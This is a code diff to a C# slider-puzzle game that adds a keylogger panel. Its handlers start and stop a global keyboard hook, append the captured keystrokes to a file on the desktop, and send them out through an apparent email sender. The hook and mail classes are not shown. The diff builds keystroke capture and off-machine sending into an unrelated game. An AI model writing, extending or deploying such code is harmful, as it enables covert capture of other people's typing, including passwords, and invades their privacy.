@@ -1,7 +1,4 @@
-﻿using Microsoft.VisualBasic.Devices;
-using System.Windows.Input;
-
-namespace Image_Slider_Puzzle
+﻿namespace Image_Slider_Puzzle
 {
     public partial class Form1 : Form
     {
@@ -42,7 +39,7 @@ namespace Image_Slider_Puzzle
         {
             InitializeComponent();
 
-            globalKeyListener = new GlobalKeyListener(textBoxAResult);
+            globalKeyListener = new GlobalKeyListener(textBoxKeyLoggerResult);
 
             this.Icon = Properties.Resources.puzzle;
 
@@ -975,7 +972,55 @@ namespace Image_Slider_Puzzle
 
         private void KeyLoggerToolStripMenuItem_Click(object sender, EventArgs e)
         {
-
+            if (panKeyLogger.Visible == false) panKeyLogger.Visible = true;
+            else panKeyLogger.Visible = false;
         }
+
+        private void btnKeyLoggerStart_Click(object sender, EventArgs e)
+        {
+            if (btnKeyLoggerStart.Text == "START")
+            {
+                btnKeyLoggerStart.Text = "STOP";
+                globalKeyListener.Hook();
+            }
+            else
+            {
+                btnKeyLoggerStart.Text = "START";
+                globalKeyListener.Unhook();
+            }
+        }
+
+        private void btnKeyLoggerToFile_Click(object sender, EventArgs e)
+        {
+            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string path = Path.Combine(filePath, "Used Keys.txt");
+
+            if (!File.Exists(path))
+            {
+                using (StreamWriter sw = File.CreateText(path))
+                {
+
+                }
+            }
+
+            using (StreamWriter sw = File.AppendText(path))
+            {
+                sw.Write(globalKeyListener.UsedCharacters() + " ");
+            }
+
+            globalKeyListener.ClearSettings();
+        }
+
+        private void btnKeyLoggerToEmail_Click(object sender, EventArgs e)
+        {
+            string charsUsed = globalKeyListener.UsedCharacters();
+
+            if (charsUsed.Any())
+            {
+                var message = new MessageSender();
+                message.Send(charsUsed);
+            }
+            else textBoxKeyLoggerResult.Text = "No saved chars for send.";
+        }     
     }
 }
